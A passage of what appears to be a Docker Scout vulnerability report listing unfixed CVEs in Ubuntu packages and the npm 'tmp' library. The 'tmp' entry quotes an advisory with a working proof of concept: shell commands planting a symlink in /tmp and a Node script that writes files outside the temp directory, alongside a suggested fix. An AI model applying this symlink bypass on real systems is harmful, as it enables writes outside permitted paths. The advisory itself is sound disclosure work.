<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HarfBuzz is a text shaping engine. Prior to version 12.3.0, a null pointer dereference vulnerability exists in the SubtableUnicodesCache::create function located in src/hb-ot-cmap-table.hh. The function fails to check if hb_malloc returns NULL before using placement new to construct an object at the returned pointer address. When hb_malloc fails to allocate memory (which can occur in low-memory conditions or when using custom allocators that simulate allocation failures), it returns NULL. The code then attempts to call the constructor on this null pointer using placement new syntax, resulting in undefined behavior and a Segmentation Fault. This issue has been patched in version 12.3.0.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libgcrypt20</strong> <code>1.10.3-2build1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/libgcrypt20@1.10.3-2build1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-2236?s=ubuntu&n=libgcrypt20&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2024--2236" src="https://img.shields.io/badge/CVE--2024--2236-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.550%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.4-3ubuntu6.1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/coreutils@9.4-3ubuntu6.1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2016-2781?s=ubuntu&n=coreutils&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2016--2781" src="https://img.shields.io/badge/CVE--2016--2781-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>shadow</strong> <code>1:4.13+dfsg1-4ubuntu3.2</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/shadow@1%3A4.13%2Bdfsg1-4ubuntu3.2?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-56433?s=ubuntu&n=shadow&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2024--56433" src="https://img.shields.io/badge/CVE--2024--56433-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>4.509%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>curl</strong> <code>8.5.0-2ubuntu10.7</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/curl@8.5.0-2ubuntu10.7?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-0167?s=ubuntu&n=curl&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2025--0167" src="https://img.shields.io/badge/CVE--2025--0167-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.222%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When asked to use a `.netrc` file for credentials **and** to follow HTTP redirects, curl could leak the password used for the first host to the followed-to host under certain circumstances.  This flaw only manifests itself if the netrc file has a `default` entry that omits both login and password. A rare circumstance.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>icu</strong> <code>74.2-1ubuntu3.1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/icu@74.2-1ubuntu3.1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5222?s=ubuntu&n=icu&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2025--5222" src="https://img.shields.io/badge/CVE--2025--5222-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack buffer overflow was found in Internationl components for unicode (ICU ). While running the genrb binary, the 'subtag' struct overflowed at the SRBRoot::addTag function. This issue may lead to memory corruption and local arbitrary code execution.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>tmp</strong> <code>0.0.33</code> (npm)</summary>

<small><code>pkg:npm/tmp@0.0.33</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-54798?s=github&n=tmp&t=npm&vr=%3C%3D0.2.3"><img alt="low 2.5: CVE--2025--54798" src="https://img.shields.io/badge/CVE--2025--54798-lightgrey?label=low%202.5&labelColor=fce1a9"/></a> <i>Improper Link Resolution Before File Access ('Link Following')</i>

<table>
<tr><td>Affected range</td><td><code><=0.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>0.2.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.


### Details

According to the documentation there are some conditions that must be held:

```
// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50

Other breaking changes, i.e.

- template must be relative to tmpdir
- name must be relative to tmpdir
- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks

are still in place.

In order to override the system's tmpdir, you will have to use the newly
introduced tmpdir option.


// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375
* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.
     absolute paths are fine as long as they point to a location under the system's default temporary directory.
     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, 
     as tmp will not check the availability of the path, nor will it establish the requested path for you.
```

Related issue: https://github.com/raszi/node-tmp/issues/207.


The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:
```js
// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579
function _resolvePath(name, tmpDir) {
  if (name.startsWith(tmpDir)) {
    return path.resolve(name);
  } else {
    return path.resolve(path.join(tmpDir, name));
  }
}
```

If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:
```js
// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609
function _assertIsRelative(name, option, tmpDir) {
  if (option === 'name') {
    // assert that name is not absolute and does not contain a path
    if (path.isAbsolute(name))
      throw new Error(`${option} option must not contain an absolute path, found "${name}".`);
    // must not fail on valid .<name> or ..<name> or similar such constructs
    let basename = path.basename(name);
    if (basename === '..' || basename === '.' || basename !== name)
      throw new Error(`${option} option must not contain a path, found "${name}".`);
  }
  else { // if (option === 'dir' || option === 'template') {
    // assert that dir or template are relative to tmpDir
    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {
      throw new Error(`${option} option must be relative to "${tmpDir}", found "${name}".`);
    }
    let resolvedPath = _resolvePath(name, tmpDir); //<--- 
    if (!resolvedPath.startsWith(tmpDir))
      throw new Error(`${option} option must be relative to "${tmpDir}", found "${resolvedPath}".`);
  }
}
```


### PoC

The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.
Tested on a Linux machine.

- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it
```bash
mkdir $HOME/mydir1

ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir
```

- check the folder is empty:
```bash
ls -lha $HOME/mydir1 | grep "tmp-"
```

- run the poc
```bash
node main.js
File:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf
test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'
test 2: dir option must be relative to "/tmp", found "/foo".
test 3: dir option must be relative to "/tmp", found "/home/user/mydir1".
```

- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):
```bash
ls -lha $HOME/mydir1 | grep "tmp-"
-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]
```


- `main.js`
```js
// npm i tmp@0.2.3

const tmp = require('tmp');

const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});
console.log('File: ', tmpobj.name);

try {
    tmp.fileSync({ 'dir': 'mydir1'});
} catch (err) {
    console.log('test 1:', err.message)
}

try {
    tmp.fileSync({ 'dir': '/foo'});
} catch (err) {
    console.log('test 2:', err.message)
}

try {
    const fs = require('node:fs');
    const resolved = fs.realpathSync('/tmp/evil-dir');
    tmp.fileSync({ 'dir': resolved});
} catch (err) {
    console.log('test 3:', err.message)
}
```


A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.
```js
function _resolvePath(name, tmpDir) {
  let resolvedPath;
  if (name.startsWith(tmpDir)) {
    resolvedPath = path.resolve(name);
  } else {
    resolvedPath = path.resolve(path.join(tmpDir, name));
  }
  return fs.realpathSync(resolvedPath);
}
```


### Impact

Arbitrary temporary file / directory write via symlink

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openexr</strong> <code>3.1.5-5.1build3</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/openexr@3.1.5-5.1build3?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-45942?s=ubuntu&n=openexr&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 5.5: CVE--2021--45942" src="https://img.shields.io/badge/CVE--2021--45942-lightgrey?label=low%205.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.617%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenEXR 3.1.x before 3.1.4 has a heap-based buffer overflow in Imf_3_1::LineCompositeTask::execute (called from IlmThread_3_1::NullThreadPoolProvider::addTask and IlmThread_3_1::ThreadPool::addGlobalTask). NOTE: db217f2 may be inapplicable.

</blockquote>
</details>
</details></td></tr>
</table>

